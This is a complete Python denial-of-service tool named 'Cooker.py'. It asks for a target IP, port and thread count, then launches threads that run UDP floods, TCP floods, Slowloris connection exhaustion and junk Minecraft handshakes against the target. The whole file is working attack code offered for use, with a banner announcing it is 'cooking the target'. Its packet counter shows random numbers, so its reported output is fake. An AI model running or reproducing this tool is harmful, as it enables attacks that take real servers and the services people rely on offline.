import socket
import time
import os
import random
import threading
import sys
import struct

def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            packet = os.urandom(random.randint(1024, 65507))
            sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def tcp_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.send(os.urandom(random.randint(1024, 4096)))
            sock.close()
        except:
            pass

def slowloris(ip, port):
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except:
            pass

    while True:
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
        try:
            new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new.connect((ip, port))
            new.send(b"GET / HTTP/1.1\r\n")
            sockets.append(new)
        except:
            pass
        time.sleep(5)

def minecraft_ping(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect((ip, port))
        handshake = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sock.send(handshake)
    except:
        pass
    finally:
        sock.close()

art = r"""


█▀▀ █▀█ █▀█ █▄▀ █▀▀ █▀█
█▄▄ █▄█ █▄█ █░█ ██▄ █▀▄

"""

os.system("clear" if os.name == "posix" else "cls")
print("\033[32m" + art)
print("\033[32mCooker.py by @Abo3leesh.")
print("\033[32m" + "="*50)

ip = input("\033[32mTarget IP: ")
port = int(input("Target Port: "))
threads = int(input("Thread Count (100-1000): "))

print("\033[32m")
os.system("clear" if os.name == "posix" else "cls")
print(art)
print(f"\033[32mTarget: {ip}:{port}")
print(f"Threads: {threads}")
print(f"Status: \033[32mWE ARE COOKING THE TARGET\033[32m")
print("="*50)

attack_methods = [udp_flood, tcp_flood, slowloris, minecraft_ping]

for i in range(threads):
    method = random.choice(attack_methods)
    t = threading.Thread(target=method, args=(ip, port), daemon=True)
    t.start()

try:
    while True:
        time.sleep(1)
        sys.stdout.write(f"\r\033[32mPackets sent: {random.randint(1000000, 9999999)} | Active threads: {threading.active_count()}")
        sys.stdout.flush()
except KeyboardInterrupt:
    print("\n\033[32mAttack stopped")
    sys.exit(0)